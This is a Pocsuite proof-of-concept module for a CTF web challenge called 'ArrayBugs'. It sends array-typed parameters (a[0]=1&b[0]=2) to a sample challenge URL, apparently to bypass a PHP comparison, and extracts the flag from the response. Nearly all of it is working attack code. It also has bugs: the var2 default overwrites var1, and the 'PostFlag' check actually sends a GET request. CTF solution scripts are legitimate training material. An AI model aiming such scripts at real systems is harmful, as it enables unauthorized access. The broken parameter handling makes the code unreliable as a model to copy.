import re
import urlparse
from pocsuite.net import req
from pocsuite.poc import POCBase,Output
from pocsuite.utils import register

class TestPOC(POCBase):
    appName='CTF'
    name='ArrayBugs'
    vulID='00000'
    version='1.0'
    author='LzSkyline'
    vulDate='0000-00-00'
    createDate='2017-09-25'
    updateDate='2017-09-25'
    references=['https://www.seebug.org/vuldb/ssvid-00000']
    appPowerLink='https://www.lzskyline.com'
    appVersion='0.0.0'
    vulType='Others'
    desc='https://www.seebug.org/'
    samples=['http://chinalover.sinaapp.com/web17/']
    def _attack(self):
        result={}
        vulurl=self.url
        # TODO;
        if not self.params["var1"]: self.params["var1"]="a";
        if not self.params["var2"]: self.params["var1"]="b";
        payload=self.params["var1"]+"[0]=1&"+self.params["var2"]+"[0]=2"
        print payload
        resp=req.get(vulurl,params=payload)
        match_result=re.search(self.params['name'] + '{(.*)}',resp.content)
        if match_result:
            result['FlagInfo']={}
            result['FlagInfo']['GetFlag']=self.params['name'] + "{" + match_result.group(1) + "}"
        resp=req.post(vulurl,params=payload)
        match_result=re.search(self.params['name'] + '{(.*)}',resp.content)
        if match_result:
            result['FlagInfo']={}
            result['FlagInfo']['PostFlag']=self.params['name'] + "{" + match_result.group(1) + "}"

        return self.parse_attack(result)
    
    def _verify(self):
        result={}
        vulurl=self.url
        # TODO;
        if not self.params["var1"]: self.params["var1"]="a";
        if not self.params["var2"]: self.params["var1"]="b";
        payload=self.params["var1"]+"[0]=1&"+self.params["var2"]+"[0]=2"
        resp=req.get(vulurl,params=payload)
        if self.params['name']+'{' in resp.content:
            result['VerifyInfo']={}
            result['VerifyInfo']['URL']=vulurl
            result['VerifyInfo']['GetFlag']="Yes"
        resp=req.get(vulurl,params=payload)
        if self.params['name']+'{' in resp.content:
            result['VerifyInfo']={}
            result['VerifyInfo']['URL']=vulurl
            result['VerifyInfo']['PostFlag']="Yes"
        return self.parse_attack(result)

    def parse_attack(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output

        
register(TestPOC)
        
